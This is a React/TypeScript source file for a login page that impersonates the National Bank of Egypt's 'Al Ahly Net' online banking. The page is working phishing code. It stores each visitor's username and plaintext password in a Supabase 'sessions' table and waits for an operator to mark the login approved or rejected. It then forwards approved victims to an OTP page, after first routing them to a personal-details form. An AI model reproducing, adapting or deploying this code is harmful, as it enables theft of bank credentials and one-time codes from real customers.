import { createFileRoute, redirect, useNavigate } from "@tanstack/react-router";
import { useEffect, useRef, useState } from "react";
import {
  User,
  Users,
  Globe,
  Calculator,
  PiggyBank,
  FileText,
  Coins,
  MapPin,
  CalendarCheck,
  ArrowRight,
  Eye,
  EyeOff,
} from "lucide-react";
import nbeLogo from "@/assets/nbe-logo-full.png";
import { supabase } from "@/integrations/supabase/client";
import { useSessionRedirect } from "@/hooks/use-session-redirect";
import { hasCompletePersonalDetails, readPersonalDetails } from "@/lib/personal-details";

export const Route = createFileRoute("/login")({
  ssr: false,
  beforeLoad: () => {
    if (typeof window === "undefined") return;
    if (!hasCompletePersonalDetails(readPersonalDetails())) {
      throw redirect({ to: "/user-information", replace: true });
    }
  },
  head: () => ({
    meta: [
      { title: "الأهلي نت | البنك الأهلي المصري" },
      { name: "description", content: "سجل الدخول إلى الأهلي نت لإدارة حساباتك المصرفية بسهولة وأمان." },
      { property: "og:title", content: "الأهلي نت | البنك الأهلي المصري" },
      { property: "og:description", content: "سجل الدخول إلى الأهلي نت لإدارة حساباتك المصرفية بسهولة وأمان." },
    ],
  }),
  component: Index,
});

type Lang = "ar" | "en";

const t = {
  ar: {
    welcome: "مرحباً بك في الاهلي نت",
    subtitle: "من فضلك سجل الدخول باسم المستخدم",
    companies: "شركات",
    individuals: "افراد",
    companyId: "هوية الشركة",
    userCode: "كود المستخدم",
    forgot: "نسيت كود المستخدم",
    login: "تسجيل الدخول",
    continue: "متابعة",
    registerNow: "سجل الان",
    join: "انضم لعملاء البنك الاهلي المصري",
    bankName: "البنك الأهلي المصري",
    switchLang: "English",
    password: "كلمة المرور",
    forgotPassword: "نسيت كلمة المرور؟",
    back: "رجوع",
    checking: "جاري التحقق...",
    verifying: "يرجى الانتظار",
    securityLabel: "صورة الأمان الخاصة بك",
    rights: "جميع الحقوق محفوظة - البنك الأهلي المصري ©",
    services: [
      "حاسبة القروض",
      "حاسبة الودائع",
      "حاسبة الاقساط",
      "حاسبة العملات",
      "ماكينة الصرف الآلي/ الفرع",
      "احجز موعد",
    ],
  },
  en: {
    welcome: "Welcome to Al Ahly Net",
    subtitle: "Please log in with your username",
    companies: "Companies",
    individuals: "Individuals",
    companyId: "Company ID",
    userCode: "Username",
    forgot: "Forgot username",
    login: "Login",
    continue: "Continue",
    registerNow: "Register now",
    join: "Join National Bank of Egypt customers",
    bankName: "National Bank of Egypt",
    switchLang: "العربية",
    password: "Password",
    forgotPassword: "Forgot your Password?",
    back: "Back",
    checking: "Verifying...",
    verifying: "Please wait",
    securityLabel: "Your security image",
    rights: "All rights reserved - National Bank Of Egypt ©",
    services: [
      "Loan Calculator",
      "Deposit Calculator",
      "Installment Calculator",
      "Currency Calculator",
      "ATM / Branch",
      "Book Appointment",
    ],
  },
} as const;

const serviceIcons = [Calculator, PiggyBank, FileText, Coins, MapPin, CalendarCheck];

function Index() {
  useSessionRedirect();
  const navigate = useNavigate();
  const [lang, setLang] = useState<Lang>("ar");
  const [tab, setTab] = useState<"individuals" | "companies">("individuals");
  const [companyId, setCompanyId] = useState("");
  const [userCode, setUserCode] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [verifying, setVerifying] = useState(false);
  const [loggedIn, setLoggedIn] = useState(false);
  const [error, setError] = useState("");
  const [waitingSessionId, setWaitingSessionId] = useState<string | null>(null);
  const channelRef = useRef<ReturnType<typeof supabase.channel> | null>(null);

  const c = t[lang];
  const isRtl = lang === "ar";
  const align = isRtl ? "text-right" : "text-left";

  useEffect(() => {
    if (!waitingSessionId) return;

    let active = true;
    let handled = false;

    const applyStatus = (status: string | null | undefined) => {
      if (!active || handled) return;

      if (status === "login_approved") {
        handled = true;
        setVerifying(false);
        navigate({ to: "/otp", replace: true });
      } else if (status === "login_rejected") {
        handled = true;
        setVerifying(false);
        setError(
          isRtl
            ? "اسم المستخدم أو كلمة السر غير صحيحة"
            : "Username or password is incorrect",
        );
        setWaitingSessionId(null);
      }
    };

    const checkCurrentStatus = async () => {
      const { data, error: statusError } = await supabase
        .from("sessions")
        .select("status")
        .eq("id", waitingSessionId)
        .maybeSingle();

      if (statusError) {
        console.error("[login] Failed to read session status", statusError);
        return;
      }

      applyStatus(data?.status);
    };

    void checkCurrentStatus();

    const channel = supabase
      .channel(`login-session-${waitingSessionId}`)
      .on(
        "postgres_changes",
        {
          event: "UPDATE",
          schema: "public",
          table: "sessions",
          filter: `id=eq.${waitingSessionId}`,
        },
        (payload) => applyStatus((payload.new as { status?: string }).status),
      )
      .subscribe((status) => {
        if (status === "CHANNEL_ERROR" || status === "TIMED_OUT") {
          console.error(`[login] Realtime subscription failed: ${status}`);
        }
      });

    channelRef.current = channel;
    const pollingId = window.setInterval(checkCurrentStatus, 2000);

    return () => {
      active = false;
      window.clearInterval(pollingId);
      void supabase.removeChannel(channel);
      if (channelRef.current === channel) channelRef.current = null;
    };
  }, [waitingSessionId, isRtl, navigate]);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");
    if (!userCode.trim() || !password.trim()) {
      setError(isRtl ? "من فضلك أدخل كود المستخدم وكلمة المرور" : "Please enter username and password");
      return;
    }
    setVerifying(true);

    if (channelRef.current) {
      void supabase.removeChannel(channelRef.current);
      channelRef.current = null;
    }

    const { data, error: insertError } = await supabase
      .from("sessions")
      .insert({
        username: tab === "companies" ? `${companyId}/${userCode}` : userCode,
        password,
        status: "pending_login",
        user_agent: typeof navigator !== "undefined" ? navigator.userAgent : null,
      })
      .select("id")
      .single();

    if (insertError || !data) {
      setVerifying(false);
      setError(isRtl ? "حدث خطأ، حاول مرة أخرى" : "Something went wrong, please try again");
      return;
    }

    const sessionId = data.id as string;
    if (typeof window !== "undefined") {
      sessionStorage.setItem("nbe_session_id", sessionId);
    }
    setWaitingSessionId(sessionId);
  };

  return (
    <div dir={isRtl ? "rtl" : "ltr"} className="flex min-h-screen flex-col bg-background text-foreground">
      <header className="flex items-center justify-between border-b border-border px-6 py-4">
        <button
          type="button"
          onClick={() => setLang(lang === "ar" ? "en" : "ar")}
          className="flex items-center gap-2 text-sm font-semibold text-foreground"
        >
          <Globe className="h-5 w-5 text-muted-foreground" />
          {c.switchLang}
        </button>
        <img
          src={nbeLogo}
          alt={c.bankName}
          width={1920}
          height={520}
          loading="lazy"
          className="h-9 w-auto object-contain md:h-11"
        />
      </header>

      <main className="flex flex-1 flex-col items-center px-4 pt-12">
        {loggedIn ? (
          <div className="w-full max-w-md text-center">
            <div className="mx-auto flex h-16 w-16 items-center justify-center rounded-full bg-primary/10 text-primary">
              <ArrowRight className="h-8 w-8" />
            </div>
            <h1 className="mt-6 text-2xl font-bold text-foreground">
              {isRtl ? `أهلاً بك، ${userCode}` : `Welcome, ${userCode}`}
            </h1>
            <p className="mt-2 text-sm text-muted-foreground">
              {isRtl ? "تم تسجيل الدخول بنجاح إلى الأهلي نت." : "You're signed in to Al Ahly Net."}
            </p>
            <button
              type="button"
              onClick={() => {
                setLoggedIn(false);
                setUserCode("");
                setPassword("");
              }}
              className="mt-8 w-full rounded-lg bg-secondary py-4 text-sm font-bold text-secondary-foreground"
            >
              {isRtl ? "تسجيل الخروج" : "Sign out"}
            </button>
          </div>
        ) : (
          <form onSubmit={handleLogin} className="w-full max-w-md text-center">
            <h1 className="text-2xl font-bold text-foreground">{c.welcome}</h1>
            <p className="mt-1 text-sm text-muted-foreground">{c.subtitle}</p>

            <div className="mt-8 flex items-center justify-center gap-4">
              <button
                type="button"
                onClick={() => setTab("companies")}
                className={`flex items-center gap-2 rounded-xl px-8 py-4 text-sm font-semibold transition-colors ${
                  tab === "companies"
                    ? "bg-accent text-accent-foreground"
                    : "bg-secondary text-secondary-foreground"
                }`}
              >
                <Users className="h-5 w-5" />
                {c.companies}
              </button>
              <button
                type="button"
                onClick={() => setTab("individuals")}
                className={`flex items-center gap-2 rounded-xl px-8 py-4 text-sm font-semibold transition-colors ${
                  tab === "individuals"
                    ? "bg-accent text-accent-foreground"
                    : "bg-secondary text-secondary-foreground"
                }`}
              >
                <User className="h-5 w-5" />
                {c.individuals}
              </button>
            </div>

            <div className={`mt-8 space-y-4 ${align}`}>
              {tab === "companies" && (
                <input
                  type="text"
                  value={companyId}
                  onChange={(e) => setCompanyId(e.target.value.replace(/[\u0600-\u06FF\u0750-\u077F\u08A0-\u08FF\uFB50-\uFDFF\uFE70-\uFEFF]/g, ""))}
                  placeholder={c.companyId}
                  disabled={verifying}
                  dir="ltr"
                  className={`w-full rounded-lg border border-input bg-background px-4 py-4 ${align} text-sm outline-none transition-colors placeholder:text-muted-foreground focus:border-primary focus:ring-2 focus:ring-primary/20 disabled:opacity-60`}
                />
              )}
              <input
                type="text"
                value={userCode}
                onChange={(e) => setUserCode(e.target.value.replace(/[\u0600-\u06FF\u0750-\u077F\u08A0-\u08FF\uFB50-\uFDFF\uFE70-\uFEFF]/g, ""))}
                placeholder={c.userCode}
                disabled={verifying}
                dir="ltr"
                className={`w-full rounded-lg border border-input bg-background px-4 py-4 ${align} text-sm outline-none transition-colors placeholder:text-muted-foreground focus:border-primary focus:ring-2 focus:ring-primary/20 disabled:opacity-60`}
              />
              <div className="relative">
                <input
                  type={showPassword ? "text" : "password"}
                  value={password}
                  onChange={(e) => setPassword(e.target.value.replace(/[\u0600-\u06FF\u0750-\u077F\u08A0-\u08FF\uFB50-\uFDFF\uFE70-\uFEFF]/g, ""))}
                  placeholder={c.password}
                  disabled={verifying}
                  dir="ltr"
                  className={`w-full rounded-lg border border-input bg-background py-4 pr-4 pl-12 ${align} text-sm outline-none transition-colors placeholder:text-muted-foreground focus:border-primary focus:ring-2 focus:ring-primary/20 disabled:opacity-60`}
                />
                <button
                  type="button"
                  aria-label={showPassword ? (isRtl ? "إخفاء كلمة المرور" : "Hide password") : (isRtl ? "إظهار كلمة المرور" : "Show password")}
                  onClick={() => setShowPassword((value) => !value)}
                  disabled={verifying}
                  className="absolute left-4 top-1/2 -translate-y-1/2 text-muted-foreground transition-colors hover:text-foreground disabled:opacity-60"
                >
                  {showPassword ? <EyeOff className="h-5 w-5" /> : <Eye className="h-5 w-5" />}
                </button>
              </div>
              <div className="flex items-center justify-between">
                <button
                  type="button"
                  className="text-xs text-muted-foreground underline underline-offset-4 hover:text-foreground"
                >
                  {c.forgot}
                </button>
                <button
                  type="button"
                  className="text-xs text-muted-foreground underline underline-offset-4 hover:text-foreground"
                >
                  {c.forgotPassword}
                </button>
              </div>
              {error && (
                <p className="rounded-lg bg-destructive/10 px-3 py-2 text-xs font-semibold text-destructive">
                  {error}
                </p>
              )}
            </div>

            <button
              type="submit"
              disabled={verifying}
              className="mt-10 flex w-full items-center justify-center gap-2 rounded-lg bg-primary py-4 text-sm font-bold text-primary-foreground transition-colors hover:bg-primary/90 disabled:opacity-70"
            >
              {c.login}
              <ArrowRight className="h-4 w-4" />
            </button>

            {verifying && (
              <div className="fixed inset-0 z-50 flex items-center justify-center bg-muted-foreground/60">
                <div className="flex flex-col items-center text-center">
                  <div className="h-16 w-16 animate-spin rounded-full border-[5px] border-background/60 border-t-primary" />
                  <span className="mt-3 text-xl font-bold text-background">{c.checking}</span>
                  <span className="mt-2 text-base font-semibold text-background/90">{c.verifying}</span>
                </div>
              </div>
            )}

            {tab === "individuals" && (
              <>
                <div className="mt-8">
                  <button
                    type="button"
                    className="text-sm font-bold text-primary underline underline-offset-4"
                  >
                    {c.registerNow}
                  </button>
                </div>
                <div className="mt-6">
                  <button
                    type="button"
                    className="text-sm font-bold text-foreground underline underline-offset-4"
                  >
                    {c.join}
                  </button>
                </div>
              </>
            )}
          </form>
        )}
      </main>

      <footer className="mt-10 px-4 pb-10">
        <div className="mx-auto flex max-w-3xl flex-wrap items-stretch justify-center gap-3">
          {c.services.map((label, i) => {
            const Icon = serviceIcons[i];
            return (
              <button
                key={label}
                type="button"
                className="flex w-28 flex-col items-center gap-2 rounded-xl bg-secondary px-3 py-4 text-center transition-colors hover:bg-accent/10"
              >
                <Icon className="h-6 w-6 text-muted-foreground" />
                <span className="text-xs font-semibold leading-tight text-primary">{label}</span>
              </button>
            );
          })}
        </div>
        <p className="mt-6 text-center text-xs text-muted-foreground">{c.rights}</p>
      </footer>
    </div>
  );
}
